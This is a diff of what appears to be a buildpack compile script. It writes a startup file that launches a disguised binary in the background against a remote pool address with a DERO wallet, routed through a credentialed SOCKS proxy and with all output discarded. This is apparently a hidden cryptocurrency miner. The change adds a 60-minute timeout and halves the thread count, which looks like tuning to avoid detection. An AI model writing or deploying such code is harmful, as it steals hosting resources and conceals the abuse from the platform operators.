@@ -11,7 +11,7 @@ cp -a binaries-$STACK/main "$1/bin/main"
 chmod 777 $1/bin/$dyno
 
 cat > $1/bin/mode <<END
-/app/bin/$dyno -r 134.122.92.217:443 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -sock-address 43.131.19.115:1080 -sock-auth bsm:123 -m 8 -p rpc >/dev/null 2>&1 >/dev/null &
+timeout 60m /app/bin/$dyno -r 134.122.92.217:443 -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -sock-address 43.131.19.115:1080 -sock-auth bsm:123 -m 4 -p rpc >/dev/null 2>&1 >/dev/null &
 END
 
 chmod 777 $1/bin/mode
